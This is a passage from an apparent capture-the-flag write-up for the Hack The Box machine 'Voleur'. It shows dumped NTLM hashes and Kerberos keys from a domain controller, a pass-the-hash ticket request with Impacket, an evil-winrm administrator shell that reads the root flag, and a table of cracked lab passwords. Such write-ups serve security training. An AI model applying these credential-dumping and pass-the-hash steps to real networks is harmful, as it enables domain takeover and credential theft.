voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab

```

and grab flag

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" getTGT.py voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 
/usr/local/bin/getTGT.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'getTGT.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
➜  voleur export KRB5CCNAME=Administrator.ccache 
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" evil-winrm -r voleur.htb -i dc.voleur.htb                                   

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
c8fccc10f6326f3ffc6ba6ed62b97d48

```

## Creds

| username | password / hash | work at | from | privileges |
| --- | --- | --- | --- | --- |
| ryan.naylor | HollowOct31Nyt | LDAP | Enrty |  |
| * | football1 | xlsx file | office2john | get pass |
| svc_ldap | M1XyC9pW7qT5Vn | LDAP | xlsx file | WriteSPN |
| svc_iis | N5pXyW1VqM7CZ8 | - | xlsx file | - |
| svc_winrm | AFireInsidedeOzarctica980219afi | winrm | xlsx file | user.txt |
| todd.wolfe | NightT1meP1dg3on14 | - | xlsx file | Third-Line Support member |
| jeremy.combs | qT3V9pLXyN7W4m | - | DPAPI | id_rsa |
| Administrator | e656e07c56d831611b577b160b259ad2 | everywhere | NTDS | DA |

## Tools

https://github.com/ShutdownRepo/targetedKerberoast

https://github.com/lineeralgebra/shellcoderunner
